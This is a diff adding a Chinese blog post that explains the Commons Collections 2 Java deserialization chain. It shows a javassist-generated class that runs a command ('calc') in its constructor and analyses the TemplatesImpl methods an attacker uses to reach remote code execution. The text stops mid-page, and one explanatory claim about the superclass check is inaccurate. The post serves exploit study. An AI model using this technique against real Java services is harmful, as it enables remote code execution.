@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Cyber Security">
+    
+    <meta name="author" content="UWI">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://nbwsws.github.io/2025/08/15/代码审计/cc2/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="~~~~~~~~~~~~~~~~~~~~~~~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cc2链调用">
+<meta property="og:url" content="https://nbwsws.github.io/2025/08/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cc2/index.html">
+<meta property="og:site_name" content="uwi~blog">
+<meta property="og:description" content="~~~~~~~~~~~~~~~~~~~~~~~">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://nbwsws.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-15T00:49:48.037Z">
+<meta property="article:modified_time" content="2025-08-16T10:10:17.935Z">
+<meta property="article:author" content="uwi">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nbwsws.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/avatar.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            cc2链调用 | UWI&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"nbwsws.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"~~~~~~~~~~~~~~~~~~~~~~~"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"UWI","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                UWI&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">cc2链调用</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.webp">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">UWI</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-15 08:49:48</span>
+        <span class="mobile">2025-08-15 08:49:48</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-16 18:10:17</span>
+            <span class="mobile">2025-08-16 18:10:17</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/java/">java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="需要引入"><a href="#需要引入" class="headerlink" title="需要引入"></a>需要引入</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;3.28.0-GA&lt;/version&gt; &lt;!-- 使用最新版本 --&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="动态创建类"><a href="#动态创建类" class="headerlink" title="动态创建类"></a>动态创建类</h1><p>这是我让ai写的一个动态创建类的方法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import javassist.*;</span><br><span class="line"></span><br><span class="line">public class DynamicClassCreator &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取 ClassPool</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        </span><br><span class="line">        // 创建一个新类</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;com.example.DynamicPerson&quot;);</span><br><span class="line">        </span><br><span class="line">        // 添加私有属性</span><br><span class="line">        CtField nameField = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, ctClass);</span><br><span class="line">        nameField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(nameField);</span><br><span class="line">        </span><br><span class="line">        CtField ageField = new CtField(CtClass.intType, &quot;age&quot;, ctClass);</span><br><span class="line">        ageField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(ageField);</span><br><span class="line">        </span><br><span class="line">        // 添加无参构造方法</span><br><span class="line">        CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">        noArgConstructor.setBody(&quot;&#123; this.name = \&quot;Unknown\&quot;; this.age = 0; &#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(noArgConstructor);</span><br><span class="line">        </span><br><span class="line">        // 添加带参构造方法</span><br><span class="line">        CtClass[] params = new CtClass[] &#123; pool.get(&quot;java.lang.String&quot;), CtClass.intType &#125;;</span><br><span class="line">        CtConstructor fullConstructor = new CtConstructor(params, ctClass);</span><br><span class="line">        fullConstructor.setBody(&quot;&#123; this.name = $1; this.age = $2; &#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(fullConstructor);</span><br><span class="line">        </span><br><span class="line">        // 添加getter和setter方法</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(&quot;getName&quot;, nameField));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(&quot;setName&quot;, nameField));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(&quot;getAge&quot;, ageField));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(&quot;setAge&quot;, ageField));</span><br><span class="line">        </span><br><span class="line">        // 添加自定义方法</span><br><span class="line">        CtMethod introduceMethod = new CtMethod(CtClass.voidType, &quot;introduce&quot;, new CtClass[0], ctClass);</span><br><span class="line">        introduceMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        introduceMethod.setBody(&quot;&#123; System.out.println(\&quot;Hello, my name is \&quot; + name + \&quot; and I&#x27;m \&quot; + age + \&quot; years old.\&quot;); &#125;&quot;);</span><br><span class="line">        ctClass.addMethod(introduceMethod);</span><br><span class="line">        </span><br><span class="line">        // 生成类文件</span><br><span class="line">        ctClass.writeFile(&quot;./target/classes&quot;);</span><br><span class="line">        </span><br><span class="line">        // 加载并使用动态创建的类</span><br><span class="line">        Class&lt;?&gt; clazz = ctClass.toClass();</span><br><span class="line">        Object person = clazz.getConstructor(String.class, int.class)</span><br><span class="line">                           .newInstance(&quot;Alice&quot;, 30);</span><br><span class="line">        </span><br><span class="line">        // 调用方法</span><br><span class="line">        clazz.getMethod(&quot;introduce&quot;).invoke(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>那么我现在来写一个简单的demo</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class cc2 &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void hack1() throws CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">        CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">        noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(noArgConstructor);</span><br><span class="line">        ctClass.writeFile();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行这段代码我们就可以看到在当前目录下生成了一个hacker的classes文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816161045138.png"
+                      alt="image-20250816161045138"
+                > </p>
+<p>我们反编译看看内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816161101489.png"
+                      alt="image-20250816161101489"
+                ></p>
+<p>定义了一个hacker类 构造方法调用计算机</p>
+<p>好了这是前置知识</p>
+<p>接下来我们看看链子是咋构造的</p>
+<p>我们先看看TemplatesImpl 类的getTransletInstance方法 </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()</span><br><span class="line">        throws TransformerConfigurationException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (_name == null) return null;</span><br><span class="line"></span><br><span class="line">            if (_class == null) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            // The translet needs to keep a reference to all its auxiliary</span><br><span class="line">            // class to prevent the GC from collecting them</span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(this);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            if (_auxClasses != null) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return translet;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            throw new TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        catch (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            throw new TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816161258902.png"
+                      alt="image-20250816161258902"
+                ></p>
+<p>这段代码中如果 实例化的使我们刚刚自己构造出来的hacker类不就能造成rce了么</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure></div>
+
+<p>我们具体看看要怎么达成这个条件</p>
+<h2 id="条件1"><a href="#条件1" class="headerlink" title="条件1."></a>条件1.</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_name 不等于 null</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来我们看看defineTransletClasses 这个方法具体干了什么</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">private void defineTransletClasses()</span><br><span class="line">    throws TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    if (_bytecodes == null) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">            public Object run() &#123;</span><br><span class="line">                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        final int classCount = _bytecodes.length;</span><br><span class="line">        _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">        if (classCount &gt; 1) &#123;</span><br><span class="line">            _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            // Check if this is the main class</span><br><span class="line">            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (_transletIndex &lt; 0) &#123;</span><br><span class="line">            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            throw new TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>首先</p>
+<h2 id="条件2："><a href="#条件2：" class="headerlink" title="条件2："></a>条件2：</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_bytecodes 不等于 null</span><br></pre></td></tr></table></figure></div>
+
+<p>这样才能才不会报错，接着往下看</p>
+<p>可以看到实例化了一个匿名类 loader</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816161803022.png"
+                      alt="image-20250816161803022"
+                ></p>
+<p>然后加载了class代码成为Class对象</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816162224266.png"
+                      alt="image-20250816162224266"
+                ></p>
+<p>同时他还会提取一个superClass 也就是这个class的父类class 并比较这个父类是否是jdk.xml.enableTemplatesImplDeserialization</p>
+<p>如果不是的话不会设置_transletIndex &#x3D; i;</p>
+<p><img  
+                     lazyload
